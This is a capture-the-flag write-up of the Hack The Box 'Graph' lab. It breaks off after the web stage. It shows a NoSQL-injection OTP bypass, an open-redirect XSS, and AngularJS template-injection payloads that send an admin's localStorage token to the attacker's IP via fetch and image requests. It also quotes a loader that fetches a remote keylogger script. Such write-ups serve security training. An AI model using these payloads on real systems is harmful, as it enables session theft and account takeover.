> Author: **[Xclow3n][author-profile]**

## Discovery

### Services

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

```shell
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
139/udp   open|filtered netbios-ssn
363/udp   open|filtered rsvp_tunnel
944/udp   open|filtered unknown
999/udp   open|filtered applix
1031/udp  open|filtered iad2
1041/udp  open|filtered danf-ak2
1043/udp  open|filtered boinc
1053/udp  open|filtered remote-as
1090/udp  open|filtered ff-fms
1105/udp  open|filtered ftranhc
1645/udp  open|filtered radius
3456/udp  open|filtered IISrpc-or-vat
5353/udp  open|filtered zeroconf
6002/udp  open|filtered X11:2
9001/udp  open|filtered etlservicemgr
16697/udp open|filtered unknown
16912/udp open|filtered unknown
17091/udp open|filtered unknown
17505/udp open|filtered unknown
18331/udp open|filtered unknown
18449/udp open|filtered unknown
19935/udp open|filtered unknown
20279/udp open|filtered unknown
20409/udp open|filtered unknown
21131/udp open|filtered unknown
21206/udp open|filtered unknown
21468/udp open|filtered unknown
21868/udp open|filtered unknown
21948/udp open|filtered unknown
22043/udp open|filtered unknown
22109/udp open|filtered unknown
27195/udp open|filtered unknown
30544/udp open|filtered unknown
30718/udp open|filtered unknown
32780/udp open|filtered sometimes-rpc24
33866/udp open|filtered unknown
41446/udp open|filtered unknown
41896/udp open|filtered unknown
42508/udp open|filtered candp
48189/udp open|filtered unknown
49181/udp open|filtered unknown
49189/udp open|filtered unknown
50164/udp open|filtered unknown
61685/udp open|filtered unknown
```

### Vhosts

The frontpage redirects to `http://graph.htb`, which goes straight into `/etc/hosts`
and allows to enumerate subdomains:

```shell
gobuster vhost -u http://10.10.11.157 --domain graph.htb --append-domain -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -o discovery/graph.htb/vhosts
# Found: internal.graph.htb (Status: 200) [Size: 607
```

### Web browsing

On port 80, the frontpage is empty but it implements an open redirect:

```javascript
if(param[0] === "?redirect"){
	window.location.replace(param[1]);
}
```

The "internal" vhost lands on a login page, and as expected, there's a "register" page too:

![][internal-registration]

It then asks for a OTP:

![][registration-otp]

Trying a few directories from the GraphQL queries, we land on a dashboard. It is
still disabled because we're unauthenticated:

![][disabled-dashboard]

But we can see an internal URL:

```
http://internal.graph.htb/inbox
```

May-be the redirection will load the page on the server and send it to us?

```
http://graph.htb/?redirect=http://internal.graph.htb/inbox
```

Doesn't work! The mail / inbox is just out of reach, it would have

### GraphQL

Login requests are handled by `internal-api.graph.htb`, a `GraphQL` API:

```
POST /graphql HTTP/1.1
Host: internal-api.graph.htb
Content-Length: 279
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Origin: http://internal.graph.htb
Referer: http://internal.graph.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"variables":{"email":"admin@admin.com","password":"admin"},"query":"mutation ($email: String!, $password: String!) {\n  login(email: $email, password: $password) {\n    email\n    username\n    adminToken\n    id\n    admin\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

If this GQL is anything like SQL it should lead to injection: this would allow
to bypass / overwrite the OTP.

#### Getting the schema

[Hacktricks][hacktricks-graphql] shows how to retrive the information about all the parameters:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"query\":\"{__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}\"}' \
    $'http://internal-api.graph.htb/graphql'
```

There are a few interesting queries / objects available: messages, upload, tasks, user.

For example:

```json
{
    "kind": "OBJECT",
    "name": "Query",
    "description": "",
    "fields": [
        {
            "name": "Messages",
            "description": "",
            "args": [],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "Message",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        },
        {
            "name": "tasks",
            "description": "",
            "args": [
                {
                    "name": "username",
                    "description": "",
                    "type": {
                        "kind": "NON_NULL",
                        "name": null,
                        "ofType": {
                            "kind": "SCALAR",
                            "name": "String",
                            "ofType": null
                        }
                    },
                    "defaultValue": null
                }
            ],
            "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                        "kind": "OBJECT",
                        "name": "task",
                        "ofType": null
                    }
                }
            },
            "isDeprecated": false,
            "deprecationReason": null
        }
    ],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null
}
```

#### Testing GraphQL queries

When asking for the messages:

```json
{
    "variables": {},
    "query": "{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"
}
```

The server blocks the request and asks for a cookie / authentication:

```json
"message":"No Cookie"
```

The user table cannot be queried:

```json
{
    "variables": {},
    "query": "{\n  User {\n    id\n    email\n    token\n    admin\n    adminToken\n    firstname\n    lastname\n  }\n}"
}
```

```json
"message":"Cannot query field \"User\" on type \"Query\".",
```

Same goes with an update operation:

```json
{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":0,"newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

```json
"code":"UNAUTHENTICATED"
```

Still the tasks can be queried by anyone:

```json
{
    "variables": {"username": "Sally"},
    "query": "query($username: String!){\n tasks(username: $username){\n Assignedto\n username\n text\n taskstatus\n type\n}\n}"
}
```

And it leaks user ids:

```json
{
    "data": {
        "tasks": [
            {"Assignedto": "629a846186ac7d05add16881", "username": null, "text": "Lorem ipsum", "taskstatus": "completed", "type": "development"}]
    }
}
```


## Registering a new user

When registering a new user, the server asks for a OTP. This is done by POSTING
to `/api/verify` with a query like:

```json
{
    "email": "apehex@graph.htb",
    "code": "1234"
}
```

This query is injectable:

```json
{
    "email": "apehex@graph.htb",
    "code": {"$ne":"1234"}
}
```

So `internal.graph.htb/register` queries `internal-api.graph.htb/api/code` and then `internal-api.graph.htb/api/verify`.

But once the email is verified, we still have to fill in the user fields. Since I queried the API directly through BurpSuite, the front-end didn't update.

The webpage links to length JavaScript files... Looking for "register", "code" and the like I found:

```javascript
registerUser(n, r, i) {
    this.http.post("http://internal-api.graph.htb/api/register", {
        email: this.email,
        password: r,
        confirmPassword: i,
        username: n
    }).subscribe(o=>{
        "Account Created Please Login!" === o.result && window.location.replace(""),
        this.result = o.result,
        setTimeout(()=>{
            this.result = ""
        }
        , 5e3)
    }
    )
}
```

The script steps through the whole registration process. So the next step is to query `internal-api.graph.htb/api/register`:

```json
{
    "email": "apehex@graph.htb",
    "password": "heyhey",
    "confirmPassword": "heyhey",
    "username": "apehex"
}
```

```json
{"result":"Account Created Please Login!"}
```

The whole process is easily scripted:

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\"}' \
    $'http://internal-api.graph.htb/api/code' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"code\":{\"$ne\":\"1234\"}}' \
    $'http://internal-api.graph.htb/api/verify' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"password\":\"heyhey\",\"confirmPassword\":\"heyhey\",\"username\":\"apehex\"}' \
    $'http://internal-api.graph.htb/api/register'
```

## Exploring the dashboard

Upon connection a JWT cookie appears:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyOGI1MTM0ZjQ5ODFlMDQzNzIwMDVkNSIsImVtYWlsIjoiYXBlaGV4QGdyYXBoLmh0YiIsImlhdCI6MTY1MzI5NzUwMSwiZXhwIjoxNjUzMzgzOTAxfQ.bdH-hdSldmdH6B9I6vdsq6-yC1r8YIoCiSSMzEJyD3E
```

This allows to query messages:

```json
{"variables":{},"query":"{\n  Messages {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

```json
{"data":{"Messages":[{"toUserName":"apehex","fromUserName":"Mark","text":"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks","to":"apehex@graph.htb","from":"mark@graph.htb","__typename":"Message"}]}}
```

There's a user "Mark" that reviewed our registration, so most likely a privileged user.

I noticed that the webapp is using the local storage:

```javascript
Login(n, r) {
    this.apollo.mutate({
        mutation: YL,
        variables: {
            email: n,
            password: r
        },
        errorPolicy: "all"
    }).subscribe(i=>{
        null === i.data && (this.errors = "Invalid Credentials"),
        i.data.login.username && (localStorage.setItem("username", i.data.login.username),
        localStorage.setItem("id", i.data.login.id),
        localStorage.setItem("email", i.data.login.email),
        localStorage.setItem("admin", i.data.login.admin),
        i.data.login.adminToken && localStorage.setItem("adminToken", i.data.login.adminToken),
        localStorage.setItem("firstname", i.data.login.firstname),
        localStorage.setItem("lastname", i.data.login.lastname),
        window.location.replace("/dashboard"))
    }
    )
}
```

These values can be edited in the dev tools:

![][local-storage]

Which makes the "upload" tab appear:

![][upload-form]

But uploading requires an `adminToken`:

```json
{"result": "Invalid Token" }
```

The dashboard is using AngularJS, and the profile page is vulnerable to SSTI! The firstname / lastname are reflected on each page and make perfect targets:

```javascript
{{$on.constructor('alert(1)')()}}
```

## Getting admin credentials on the web portal

### Triggering the payload

Since we can message "Mark", there may be a way to gain his token. Let's poke Larry / Mark / James with a link to our server:

```json
{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
```

Which they actually follow:

```
Ncat: Connection from 10.10.11.157:51338.
/GET /%7B%7D HTTP/1.1
Host: 10.10.16.2:9999
```

But the page is opened from a context where the local storage is empty: `%7B%7D` is `{}`.

Next, let's try and inject JS directly into the redirect argument:

```
http://graph.htb/?redirect=javascript:alert(1)
```

Still, I couldn't get the admin token because the execution context must be `internal.graph.htb` and not `graph.htb`.

The localstorage is not shared, and the [technique using `<iframe>`][share-localstorage] tags did not work for me.

I also looked up the author and saw a [blog post about a similar XSS][xss-blogpost], but the keylogger idea is not relevant here.

```javascript
var r=document.createElement("script");r.src="http://10.10.16.4:8888/keylogger.js";document.head.appendChild(r);var x=;
```

### Scripting each step

The whole exfiltration process involves 2 actions.

#### Getting the admin user id

```shell
bash payloads/get_userid.sh Mark
# 629a92724c761106406708ca
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"variables\": {\"username\": \"'"$@"$'\"}, \"query\": \"query($username: String!){\\n tasks(username: $username){\\n Assignedto\\n username\\n text\\n taskstatus\\n type\\n}\\n}\"}' \
    $'http://internal-api.graph.htb/graphql' |
perl -ne $'m#"Assignedto":"([a-fA-F0-9]+)"# && print $1."\n"'
```

#### Redirecting the admin user

First, encode the payloads and include it in the open redirect:

```shell
PAYLOAD=$(echo -n "$@" | base64 -w 0)
echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));'
```

For some reason, the "=" padding needs to be removed for JS to decode the payload:

```
http://graph.htb/?redirect=javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
```

Then it can be pasted in the messaging panel.

#### Updating the admin profile

The redirect is used to take advantage of the SSTI on the user profile. The SSTI payload is planted after updating the admin profile with GraphQL:

```json
{"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
```

Which can be queried via JS:

```javascript
fetch("http://internal-api.graph.htb/graphql", {
    method: "POST",
    headers: {"Content-Type": "application/json",},
    credentials: "include",
    body: JSON.stringify({"operationName":"update","variables":{"firstname":"{{$on.constructor('alert(1);')()}}","lastname":"null","id":"629b97099e22050421afde2d","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
})
```

### Reading the local storage

The previous SSTI payload can be improved to read the local storage:

```javascript
{{$on.constructor('new Image.src="http://10.10.16.2:9999/?t="+window.localStorage.getItem("adminToken");')()}}
```

This can be parametrized and encapsulated into a JS fetch request:

```shell
PAYLOAD='{{$on.constructor('"'"'new Image().src=\"http://'"${IP}"'/?token=\"+window.localStorage.getItem(\"adminToken\");'"'"')()}}'
CODE='fetch("http://internal-api.graph.htb/graphql", {
    method: "POST",
    headers: {"Content-Type": "application/json",},
    credentials: "include",
    body: JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n update(\n newusername: $newusername\n id: $id\n firstname: $firstname\n lastname: $lastname\n) {\n username\n email\n id\n firstname\n lastname\n __typename\n}\n}"}),
})'
```

### Exfiltrate and admin token

Now the exfiltration process is more straightforward:

```shell
# create a new web user
bash payloads/register.sh
# get the user id of the admin that sends a message
bash payloads/get_userid.sh Mark
# craft a redirect XSS to inject the exfiltration payload in the admin profile
bash payloads/ssti_profile.sh $'629babb17f2d0a05fc3730f1' $'Mark' $'10.10.16.2:9999' | uglifyjs > payload
# generate the redirection URL
bash payloads/redirect.sh $(cat payload)
# finally, send the resulting URL to the admin by message
# and then redirect to the logout to actually load the code from the server
```

And fi-nal-ly exfiltrate an "adminToken"! O-M-G...

```

```

## Compromise an OS used

[author-profile]: https://app.hackthebox.com/users/172213
[disabled-dashboard]: images/disabled-dashboard.png
[internal-registration]: images/interal-registration.png*
[local-storage]: images/local-storage.png
[registration-otp]: images/registration-otp.png
[share-localstorage]: https://stackoverflow.com/questions/4026479/use-localstorage-across-subdomains
[upload-form]: images/upload-form.png
[xss-blogpost]: https://xclow3n.github.io/bugBounty/myFirstBounty.html
